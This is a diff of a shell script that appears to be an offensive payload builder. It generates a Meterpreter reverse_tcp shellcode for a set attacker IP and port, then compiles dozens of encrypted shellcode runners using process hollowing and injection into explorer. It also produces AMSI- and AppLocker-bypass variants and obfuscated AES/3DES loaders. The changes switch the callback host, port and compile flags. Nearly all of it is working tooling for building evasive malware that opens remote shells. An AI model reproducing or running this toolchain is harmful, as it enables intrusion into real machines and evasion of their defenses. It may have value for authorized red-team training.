@@ -10,8 +10,8 @@ OUTPUT_XOR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/XOR"
 
 PROCESS_TO_INJECT="explorer"
 MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
-LHOST="192.168.49.109"
-LPORT=443
+LHOST="192.168.49.121"
+LPORT=8080
 
 
 #Generating a shellcode
@@ -42,8 +42,8 @@ sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${P
 # Complile Encrypters.cs 
 echo "[+] Compile the CS file..."
 mcs Templates/Caesar/caesar_encrypter.cs
-mcs Templates/XOR/xor_encrypter.cs
-mcs Templates/XOR/xor_encrypter_v2.cs
+mcs -platform:x64 Templates/XOR/xor_encrypter.cs
+mcs -platform:x64 Templates/XOR/xor_encrypter_v2.cs
 
 # Generating Encrypted Shellcodes.
 echo "[+] Generating Encrypted shellcodes ..."
@@ -95,21 +95,21 @@ mcs -target:library -out:payloads/XOR/shellcode_runner_hollow_dotnet2jsscript.dl
 
 # Complile the Shellcode Runner as EXE
 echo "[+] Creating EXE ..."
-mcs -out:payloads/Caesar/shellcode_runner_assembly.exe Templates/Caesar/shellcode_runner_assembly.cs &>/dev/null
-mcs -out:payloads/Caesar/shellcode_runner_assembly_numa.exe Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
-mcs -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.exe Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
-mcs -out:payloads/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
-mcs -out:payloads/Caesar/shellcode_runner_hollow.exe Templates/Caesar/shellcode_runner_hollow.cs &>/dev/null
-mcs -out:payloads/Caesar/shellcode_runner_hollow_dotnet2jsscript.exe Templates/Caesar/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null
+mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_assembly.exe Templates/Caesar/shellcode_runner_assembly.cs &>/dev/null
+mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_assembly_numa.exe Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
+mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.exe Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
+mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
+mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_hollow.exe Templates/Caesar/shellcode_runner_hollow.cs &>/dev/null
+mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_hollow_dotnet2jsscript.exe Templates/Caesar/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null
 
 
-mcs -out:payloads/XOR/shellcode_runner_assembly.exe Templates/XOR/shellcode_runner_assembly.cs &>/dev/null
-mcs -out:payloads/XOR/shellcode_runner_assembly_dotnet2jsscript.exe Templates/XOR/shellcode_runner_assembly_dotnet2jsscript.cs &>/dev/null
-mcs -out:payloads/XOR/shellcode_runner_assembly_numa.exe Templates/XOR/shellcode_runner_assembly_numa.cs &>/dev/null
-mcs -out:payloads/XOR/shellcode_runner_assembly_numa_marshal.exe Templates/XOR/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
-mcs -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
-mcs -out:payloads/XOR/shellcode_runner_hollow.exe Templates/XOR/shellcode_runner_hollow.cs &>/dev/null
-mcs -out:payloads/XOR/shellcode_runner_hollow_dotnet2jsscript.exe Templates/XOR/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null
+mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly.exe Templates/XOR/shellcode_runner_assembly.cs &>/dev/null
+mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly_dotnet2jsscript.exe Templates/XOR/shellcode_runner_assembly_dotnet2jsscript.cs &>/dev/null
+mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly_numa.exe Templates/XOR/shellcode_runner_assembly_numa.cs &>/dev/null
+mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly_numa_marshal.exe Templates/XOR/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
+mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
+mcs -platform:x64 -out:payloads/XOR/shellcode_runner_hollow.exe Templates/XOR/shellcode_runner_hollow.cs
+
 
 echo "[+] Creating C++ EXE (plus UPX) ..."
 x86_64-w64-mingw32-gcc Templates/XOR/shellcode_runner_xor.cpp -o payloads/XOR/shellcode_runner_cpp.exe &>/dev/null
@@ -137,12 +137,12 @@ echo "[+] Creating TXT ..."
 cp Templates/AMSI/amsi_runner_template.txt payloads/AMSI/shellcode_runner.txt
 sed -i 's/SHELLCODE/'"${SHELLCODE}"'/g' payloads/AMSI/shellcode_runner.txt
 
-echo "[+] Creating MSI ..."
-mono Templates/MSI/wix311-binaries/candle.exe -out Templates/MSI/ -arch x64 Templates/MSI/shellcode_runner.xml &>/dev/null
-wine Templates/MSI/wix311-binaries/light.exe -out Templates/MSI/shellcode_runner.msi Templates/MSI/shellcode_runner.wixobj -sval &>/dev/null
-rm Templates/MSI/shellcode_runner.wixpdb
-rm Templates/MSI/shellcode_runner.wixobj
-mv Templates/MSI/shellcode_runner.msi payloads/MSI/shellcode_runner.msi
+#echo "[+] Creating MSI ..."
+#mono Templates/MSI/wix311-binaries/candle.exe -out Templates/MSI/ -arch x64 Templates/MSI/shellcode_runner.xml &>/dev/null
+#wine Templates/MSI/wix311-binaries/light.exe -out Templates/MSI/shellcode_runner.msi Templates/MSI/shellcode_runner.wixobj -sval &>/dev/null
+#rm Templates/MSI/shellcode_runner.wixpdb
+#rm Templates/MSI/shellcode_runner.wixobj
+#mv Templates/MSI/shellcode_runner.msi payloads/MSI/shellcode_runner.msi
 
 echo "[+] Creating InstallUtil ..."
 cp Templates/Applocker/InstallUtil.cs payloads/Applocker/
@@ -154,8 +154,8 @@ cp Templates/AES/AES_Deflate_HTTP.cs payloads/AES/AES_Deflate_HTTP.cs
 cp Templates/AES/AES_Deflate_SMB.cs payloads/AES/AES_Deflate_SMB.cs
 sed -i 's/KALI_IP/'${LHOST}'/g' payloads/AES/AES_Deflate_HTTP.cs
 sed -i 's/KALI_IP/'${LHOST}'/g' payloads/AES/AES_Deflate_SMB.cs
-mcs -out:payloads/AES/AES_Deflate_HTTP.exe payloads/AES/AES_Deflate_HTTP.cs
-mcs -out:payloads/AES/AES_Deflate_SMB.exe payloads/AES/AES_Deflate_SMB.cs
+mcs -platform:x64 -out:payloads/AES/AES_Deflate_HTTP.exe payloads/AES/AES_Deflate_HTTP.cs
+mcs -platform:x64 -out:payloads/AES/AES_Deflate_SMB.exe payloads/AES/AES_Deflate_SMB.cs
 
 
 echo "[+] Creating web.config file (Non-Encrypted)..."
@@ -176,9 +176,9 @@ cp Templates/3DES/des_decryptor_embeded.cs payloads/3DES/des_decryptor_embeded.c
 cp Templates/3DES/des_decryptor_embeded_marshal.cs payloads/3DES/des_decryptor_embeded_marshal.cs
 sed -i 's#.*EncryptedB64String = .B64_PAYLOAD.#string EncryptedB64String = "'${B64_EMBEDED}'"#g' payloads/3DES/des_decryptor_embeded.cs
 sed -i 's#.*EncryptedB64String = .B64_PAYLOAD.#string EncryptedB64String = "'${B64_EMBEDED_MARSHAL}'"#g' payloads/3DES/des_decryptor_embeded_marshal.cs
-mcs Templates/3DES/des_decryptor.cs &>/dev/null
-mcs payloads/3DES/des_decryptor_embeded.cs &>/dev/null
-mcs payloads/3DES/des_decryptor_embeded_marshal.cs &>/dev/null 
+mcs -platform:x64 Templates/3DES/des_decryptor.cs &>/dev/null
+mcs -platform:x64 payloads/3DES/des_decryptor_embeded.cs &>/dev/null
+mcs -platform:x64 payloads/3DES/des_decryptor_embeded_marshal.cs &>/dev/null 
 cp Templates/3DES/des_decryptor.exe payloads/3DES/des_decryptor.exe
 
 echo "[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ..."
